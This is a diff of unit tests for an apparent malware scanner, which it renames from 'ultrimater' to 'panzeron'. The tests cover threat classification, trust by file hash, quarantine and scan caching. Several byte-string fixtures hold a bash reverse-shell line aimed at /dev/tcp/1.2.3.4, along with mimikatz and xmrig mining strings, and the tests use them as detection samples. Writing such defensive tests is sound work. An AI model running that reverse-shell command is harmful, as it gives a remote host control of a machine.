@@ -1,11 +1,11 @@
 import base64, hashlib, json, os, shutil, tempfile, threading, time, unittest, urllib.request
 from pathlib import Path
-from ultrimater.shield import scopes
-from ultrimater.shield.quarantine import ConfirmationRequired, QuarantineError
-from ultrimater.shield.scancache import ScanCache
-from ultrimater.shield.scanner import EICAR, ULTRIMATER_MARKER, ULTRIMATER_SIM, Scanner, inspect_content
-from ultrimater.shield.trust import MANIFEST_NAME, TrustStore
-from ultrimater.api.server import create_server
+from panzeron.shield import scopes
+from panzeron.shield.quarantine import ConfirmationRequired, QuarantineError
+from panzeron.shield.scancache import ScanCache
+from panzeron.shield.scanner import EICAR, PANZERON_MARKER, PANZERON_SIM, Scanner, inspect_content
+from panzeron.shield.trust import MANIFEST_NAME, TrustStore
+from panzeron.api.server import create_server
 from tests.helpers import SALT, new_app
 
 PROJECT = Path(__file__).resolve().parent.parent
@@ -25,7 +25,7 @@ class DangerClassificationTests(unittest.TestCase):
         self.assertEqual([x.severity.value for x in r], ["info"]); self.assertEqual(r[0].category, "shield.signature_mention")
 
     def test_simulated_threat_is_high_and_clearly_labelled(self):
-        r = f("evil.txt", ULTRIMATER_SIM); self.assertEqual(r[0].severity.value, "high"); self.assertIn("SIMULATED", r[0].explanation); self.assertIn("Simulated", r[0].title)
+        r = f("evil.txt", PANZERON_SIM); self.assertEqual(r[0].severity.value, "high"); self.assertIn("SIMULATED", r[0].explanation); self.assertIn("Simulated", r[0].title)
 
     def test_files_matching_many_unrelated_attack_families_look_like_rulesets(self):
         data = b"mimikatz sekurlsa:: bash -i >& /dev/tcp/1.2.3.4/9 0>&1 stratum+tcp://pool xmrig --donate-level"
@@ -49,8 +49,8 @@ class DangerClassificationTests(unittest.TestCase):
 
 class SelfTrustTests(unittest.TestCase):
     def make_install(self):
-        root = Path(tempfile.mkdtemp()) / "Ultrimater"; (root / "pkg").mkdir(parents=True)
-        (root / "pkg" / "scanner.py").write_bytes(b"MARK = b'" + ULTRIMATER_MARKER + b"'\n# bash -i >& /dev/tcp/1.2.3.4/9 0>&1 mimikatz xmrig stratum+tcp://x --donate-level\n")
+        root = Path(tempfile.mkdtemp()) / "Panzeron"; (root / "pkg").mkdir(parents=True)
+        (root / "pkg" / "scanner.py").write_bytes(b"MARK = b'" + PANZERON_MARKER + b"'\n# bash -i >& /dev/tcp/1.2.3.4/9 0>&1 mimikatz xmrig stratum+tcp://x --donate-level\n")
         (root / "tests.py").write_bytes(b"x = b'" + EICAR + b"'")
         (root / "notes.txt").write_text("just my notes")
         ts = TrustStore(root); ts.rebuild(); return root, TrustStore(root)
@@ -77,15 +77,15 @@ class SelfTrustTests(unittest.TestCase):
 
     def test_trust_is_by_content_not_by_folder_name(self):
         root, ts = self.make_install()
-        other = Path(tempfile.mkdtemp()) / "Ultrimater"; shutil.copytree(root, other)             # same name, same files, but NOT the install folder
+        other = Path(tempfile.mkdtemp()) / "Panzeron"; shutil.copytree(root, other)             # same name, same files, but NOT the install folder
         _, fs = Scanner(SALT, mode="smart", trust=ts).scan(str(other)); self.assertTrue(len(fs) >= 1)
 
     def test_python_bytecode_cache_of_our_modules_is_trusted(self):
-        root, ts = self.make_install(); (root / "pkg" / "__pycache__").mkdir(); (root / "pkg" / "__pycache__" / "scanner.cpython-312.pyc").write_bytes(b"\0" + ULTRIMATER_MARKER)
+        root, ts = self.make_install(); (root / "pkg" / "__pycache__").mkdir(); (root / "pkg" / "__pycache__" / "scanner.cpython-312.pyc").write_bytes(b"\0" + PANZERON_MARKER)
         self.assertEqual(Scanner(SALT, trust=ts).scan(str(root))[1], [])
 
     def test_the_real_project_scans_clean_with_its_own_manifest(self):                               # the actual project, copied so nothing is modified
-        copy = Path(tempfile.mkdtemp()) / "ultrimater"
+        copy = Path(tempfile.mkdtemp()) / "panzeron"
         shutil.copytree(PROJECT, copy, ignore=shutil.ignore_patterns("__pycache__", ".git", MANIFEST_NAME)); ts = TrustStore(copy); n = ts.rebuild()
         res, fs = Scanner(SALT, mode="smart", trust=ts).scan(str(copy))
         self.assertEqual([x.title for x in fs], []); self.assertEqual(res.verdict, "clean"); self.assertGreaterEqual(res.files_trusted, n)
@@ -112,10 +112,10 @@ class AppIntegrationTests(unittest.TestCase):
             time.sleep(0.05)
 
     def test_vault_is_never_rescanned_and_demo_is_skipped_in_broad_scans(self):
-        app = new_app(); marker = app.paths.vault / "q_1.quar"; marker.write_bytes(ULTRIMATER_SIM)
+        app = new_app(); marker = app.paths.vault / "q_1.quar"; marker.write_bytes(PANZERON_SIM)
         s = self.wait(app, app.start_scan(str(app.paths.home))["scan_id"])
         self.assertEqual((s["verdict"], s["finding_ids"]), ("clean", [])); self.assertTrue(any("vault" in d["reason"] for d in s["skipped_dirs"]))
-        demo_file = app.paths.demo / "x.txt"; demo_file.parent.mkdir(exist_ok=True); demo_file.write_bytes(ULTRIMATER_SIM)
+        demo_file = app.paths.demo / "x.txt"; demo_file.parent.mkdir(exist_ok=True); demo_file.write_bytes(PANZERON_SIM)
         plan = scopes.ScopePlan("user", "My user folders", [app.paths.home], [], True, "", "")
         from unittest import mock
         with mock.patch.object(scopes, "build_plan", return_value=plan):
@@ -123,22 +123,22 @@ class AppIntegrationTests(unittest.TestCase):
         self.assertEqual(s["finding_ids"], []); self.assertTrue(any("demo" in d["reason"].lower() for d in s["skipped_dirs"]))
         s = self.wait(app, app.start_scan(str(app.paths.demo))["scan_id"]); self.assertEqual(len(s["finding_ids"]), 1)      # picking it yourself still scans it
 
-    def test_ultrimaters_own_files_cannot_be_quarantined(self):
-        app = new_app(); inside = app.trust.root / "tests" / "_tmp_probe.txt"; inside.write_bytes(ULTRIMATER_SIM)
+    def test_panzerons_own_files_cannot_be_quarantined(self):
+        app = new_app(); inside = app.trust.root / "tests" / "_tmp_probe.txt"; inside.write_bytes(PANZERON_SIM)
         try:
             with self.assertRaises(QuarantineError): app.vault.quarantine(str(inside), None, confirm=True)
             self.assertTrue(inside.exists()); self.assertTrue(app.vault.is_protected(inside))
         finally: inside.unlink(missing_ok=True)
 
     def test_trust_this_exact_file_by_hash(self):
-        app = new_app(); d = Path(tempfile.mkdtemp()); (d / "a.txt").write_bytes(ULTRIMATER_SIM)
+        app = new_app(); d = Path(tempfile.mkdtemp()); (d / "a.txt").write_bytes(PANZERON_SIM)
         self.wait(app, app.start_scan(str(d))["scan_id"]); fnd = app.db.list_findings(module="shield")[0]
         self.assertIn("trust_hash", [a["type"] for a in app.response.available_actions(fnd)])
         with self.assertRaises(ConfirmationRequired): app.response.execute("trust_hash", fnd.id, confirm=False)
         app.response.execute("trust_hash", fnd.id, confirm=True)
-        (d / "renamed_copy.txt").write_bytes(ULTRIMATER_SIM)                                           # same content, new name: still trusted
+        (d / "renamed_copy.txt").write_bytes(PANZERON_SIM)                                           # same content, new name: still trusted
         s = self.wait(app, app.start_scan(str(d))["scan_id"]); self.assertEqual(s["finding_ids"], [])
-        (d / "a.txt").write_bytes(ULTRIMATER_SIM + b" changed"); s = self.wait(app, app.start_scan(str(d))["scan_id"]); self.assertEqual(len(s["finding_ids"]), 1)   # changed content is checked again
+        (d / "a.txt").write_bytes(PANZERON_SIM + b" changed"); s = self.wait(app, app.start_scan(str(d))["scan_id"]); self.assertEqual(len(s["finding_ids"]), 1)   # changed content is checked again
 
     def test_integrity_api(self):
         app = new_app(); srv, tok = create_server(app, 0); threading.Thread(target=srv.serve_forever, daemon=True).start()
@@ -166,7 +166,7 @@ class ScanCacheTests(unittest.TestCase):
         second, _ = self.scan(); self.assertEqual((second.files_cached, second.files_scanned), (30, 30)); self.assertEqual(second.bytes_scanned, 0)
 
     def test_a_changed_file_is_rescanned_and_findings_are_never_cached(self):
-        self.scan(); (self.d / "f1.txt").write_bytes(ULTRIMATER_SIM)
+        self.scan(); (self.d / "f1.txt").write_bytes(PANZERON_SIM)
         r, fs = self.scan(); self.assertEqual((r.files_cached, len(fs)), (29, 1))
         r, fs = self.scan(); self.assertEqual((r.files_cached, len(fs)), (29, 1))                      # still reported every time
 
